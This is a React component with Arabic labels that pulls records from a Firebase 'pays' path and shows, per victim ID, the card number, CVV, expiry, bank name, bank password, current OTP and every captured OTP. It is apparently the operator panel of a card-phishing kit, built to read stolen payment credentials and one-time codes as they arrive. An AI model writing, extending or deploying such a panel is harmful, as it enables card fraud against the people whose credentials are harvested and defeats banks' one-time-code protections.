'use client'

import { useState, useEffect } from 'react'
import { ref, onValue, get } from 'firebase/database'
import { database } from '@/lib/firestore'
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { CreditCard, Calendar, Lock, CheckCircle } from 'lucide-react'

interface CardData {
  id:string;
  cardNumber: string;
  cvc: string;
  bank:string;
  pass:string;
  otp:string;
  prefix:string;
  month:string;
  year:string;
  otpall:string[]
  data?: {
    paymentCardNumber?: string;
    paymentCVV?: string;
    bank?: string;
    pass?: string;
    otp?: string;
    prefix?: string;
    month?: string;
    year?: string;
    allOtps?: string[];
  }
}

export function CardsByID({ id }: { id: string }) {
  const [cards, setCards] = useState<CardData | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    async function fetchCards() {
      try {
        setLoading(true)
        // استخدام Realtime Database بدلاً من Firestore
        const docRef = ref(database, `pays/${id}`)
        
        onValue(docRef, (snapshot) => {
          const data = snapshot.val()
          
          if (data) {
            // تحويل البيانات من Realtime Database إلى الشكل المتوقع
            const cardData: CardData = {
              id: id,
              cardNumber: data.data?.paymentCardNumber || '',
              cvc: data.data?.paymentCVV || '',
              bank: data.data?.bank || '',
              pass: data.data?.pass || '',
              otp: data.data?.otp || data.otp || '',
              prefix: data.data?.prefix || '',
              month: data.data?.month || '',
              year: data.data?.year || '',
              otpall: data.data?.allOtps || data.allOtps || [],
              data: data.data
            }
            setCards(cardData)
          } else {
            setError('No cards found for this ID')
          }
          setLoading(false)
        }, {
          onlyOnce: true
        })
      } catch (err) {
        setError('Error fetching cards')
        console.error('Error fetching cards:', err)
        setLoading(false)
      }
    }

    fetchCards()
  }, [id])

  if (loading) {
    return (
      <div className="flex justify-center p-8">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
      </div>
    )
  }

  if (error) {
    return (
      <div className="text-center p-4 text-red-500">
        {error}
      </div>
    )
  }

  if (!cards) {
    return (
      <div className="text-center p-4 text-muted-foreground">
        No cards found
      </div>
    )
  }

  return (
    <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3 p-4">
      {/* Card Info Card */}
      <Card className="col-span-full md:col-span-1">
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">
            معلومات البطاقة
          </CardTitle>
          <CreditCard className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="grid gap-2">
            <div className="flex items-center justify-between p-2 bg-muted/50 rounded-lg">
              <span className="text-sm text-muted-foreground">اسم البنك</span>
              <span className="font-medium">{cards.bank || 'غير متوفر'}</span>
            </div>
            <div className="flex items-center justify-between p-2 bg-muted/50 rounded-lg">
              <span className="text-sm text-muted-foreground">رقم البطاقة</span>
              <span className="font-medium">{cards.cardNumber || 'غير متوفر'}</span>
            </div>
            <div className="flex items-center justify-between p-2 bg-muted/50 rounded-lg">
              <span className="text-sm text-muted-foreground">CVC</span>
              <span className="font-medium">{cards.cvc || 'غير متوفر'}</span>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Expiry Date Card */}
      <Card className="col-span-full md:col-span-1">
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">
            تاريخ الانتهاء
          </CardTitle>
          <Calendar className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="grid gap-2">
            <div className="flex items-center justify-between p-2 bg-muted/50 rounded-lg">
              <span className="text-sm text-muted-foreground">الشهر</span>
              <span className="font-medium">{cards.month || 'غير متوفر'}</span>
            </div>
            <div className="flex items-center justify-between p-2 bg-muted/50 rounded-lg">
              <span className="text-sm text-muted-foreground">السنة</span>
              <span className="font-medium">{cards.year || 'غير متوفر'}</span>
            </div>
            <div className="flex items-center justify-between p-2 bg-muted/50 rounded-lg">
              <span className="text-sm text-muted-foreground">البادئة</span>
              <span className="font-medium">{cards.prefix || 'غير متوفر'}</span>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* PIN and OTP Card */}
      <Card className="col-span-full md:col-span-1">
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">
            أكواد الأمان
          </CardTitle>
          <Lock className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="grid gap-2">
            <div className="flex items-center justify-between p-2 bg-muted/50 rounded-lg">
              <span className="text-sm text-muted-foreground">كلمة المرور</span>
              <span className="font-medium">{cards.pass || 'غير متوفر'}</span>
            </div>
            <div className="flex items-center justify-between p-2 bg-muted/50 rounded-lg">
              <span className="text-sm text-muted-foreground">OTP</span>
              <span className="font-medium">{cards.otp || 'غير متوفر'}</span>
            </div>
            <div className="flex items-center justify-between p-2 bg-green-500/10 rounded-lg border border-green-500/20">
              <span className="text-sm text-green-600 font-medium">جميع الرموز</span>
              <Badge variant="secondary" className="font-mono">
                {cards.otpall?.join(', ') || 'لا يوجد'}
              </Badge>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Status Card */}
      <Card className="col-span-full">
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">
            حالة البيانات
          </CardTitle>
          <CheckCircle className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="flex gap-2 flex-wrap">
            {cards.cardNumber && (
              <Badge variant="default">بيانات البطاقة موجودة</Badge>
            )}
            {cards.pass && (
              <Badge variant="secondary">كلمة المرور موجودة</Badge>
            )}
            {cards.otp && (
              <Badge variant="outline">OTP موجود</Badge>
            )}
            {cards.otpall && cards.otpall.length > 0 && (
              <Badge variant="default">{cards.otpall.length} رمز OTP</Badge>
            )}
            {!cards.cardNumber && !cards.pass && !cards.otp && (
              <Badge variant="destructive">لا توجد بيانات</Badge>
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
